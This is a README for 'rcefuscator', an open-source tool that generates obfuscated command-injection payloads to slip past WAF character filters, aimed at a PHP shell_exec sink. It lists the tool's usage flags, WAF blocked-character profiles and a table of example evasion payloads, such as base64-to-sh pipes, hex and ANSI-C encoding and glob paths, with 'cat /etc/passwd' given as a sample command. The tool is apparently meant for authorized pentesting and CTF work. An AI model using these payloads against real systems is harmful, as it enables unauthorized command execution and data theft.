# rcefuscator

> **RCE Payload Generator & WAF Evasion Toolkit** — for authorized penetration testing, CTF challenges, and security research.

Takes a user-supplied OS command (e.g. `id`, `whoami`, `cat /etc/passwd`) and outputs multiple obfuscated payload variants designed to bypass naïve WAF filters that block common injection characters (`;`, `|`, `&`, `$`, backticks, `(`, `)`). Targets the `shell_exec($_GET['cmd'])` PHP sink context but applies broadly to any command injection scenario.

---

> ⚠️ **[READ DISCLAIMER](DISCLAIMER.md)** — This tool is strictly for **authorized** use. Misuse is illegal.

---

## Install

```bash
git clone https://github.com/ak4hit/rcefuscator.git
cd rcefuscator
pip install -e .
```

### Linux Clipboard Support (optional)

```bash
sudo apt install xclip     # Debian/Ubuntu/Kali
sudo pacman -S xclip       # Arch
sudo dnf install xclip     # Fedora
```

---

## Usage

```bash
# Generate all payloads for a command
rcefuscator --cmd "id"

# Apply a WAF profile filter
rcefuscator --cmd "id" --profile strict

# Custom blacklist
rcefuscator --cmd "whoami" --blacklist "; | & \`"

# JSON output
rcefuscator --cmd "id" --json

# Save to file
rcefuscator --cmd "id" --output payloads.txt

# Single technique only
rcefuscator --cmd "id" --technique base64

# List all available techniques
rcefuscator --list-techniques

# Copy first clean result to clipboard
rcefuscator --cmd "id" --copy
```

---

## Techniques

| # | Technique | Example Output (`id`) | Uses Chars | Shell |
|---|-----------|----------------------|------------|-------|
| 1 | Base64 Encoding | `echo 'aWQ=' \| base64 -d \| sh` | `\|` | bash/sh |
| 2 | Hex Encoding | `printf '%s' '\x69\x64' \| xxd -p -r \| sh` | `\|` | bash/sh |
| 3 | ANSI-C Quoting | `$'\x69\x64'` | `$`, `'` | bash |
| 4 | Variable Splitting | `_a=i;_b=d;$_a$_b` | `$` | bash/sh |
| 5 | Wildcard/Glob | `/???/bin/id` | none | bash/sh |
| 6 | Reverse String | `echo 'di' \| rev \| sh` | `\|` | bash/sh |
| 7 | Case Manipulation | `echo 'ID' \| tr 'A-Z' 'a-z' \| sh` | `\|` | bash/sh |
| 8 | Command Substitution | `$(printf '\x69\x64')` | `$`, `(`, `)` | bash |

---

## WAF Profiles

| Profile | Blocked Characters |
|---------|-------------------|
| `moderate` | `; \| & \`` |
| `strict` | `; \| & $ \` ( ) < > space` |
| `paranoid` | `; \| & $ \` ( ) < > space ' " \` |
| `custom` | Defined by `--blacklist` flag |

---

## How It Works

Each technique exploits a different shell feature to execute a command without typing it literally:

- **Base64 / Hex / Reverse**: Encode the command as a safe string, decode at runtime via a pipeline.
- **ANSI-C Quoting**: Bash expands `$'\x69\x64'` directly — no pipes needed.
- **Variable Splitting**: Stores command fragments in variables, concatenates at execution time.
- **Wildcard/Glob**: Uses `???` patterns to match binary paths without typing them.
- **Case Manipulation**: Uppercases the command and uses `tr` to lowercase it at runtime.
- **Command Substitution**: Nests hex-encoded command inside `$(...)` for inline execution.

---

## Contributing

Pull requests welcome. Please:
1. Fork the repo
2. Create a branch: `git checkout -b feat/your-feature`
3. Open a PR against `main`

---

## License

[MIT](LICENSE) — Copyright (c) 2026 ak4hit
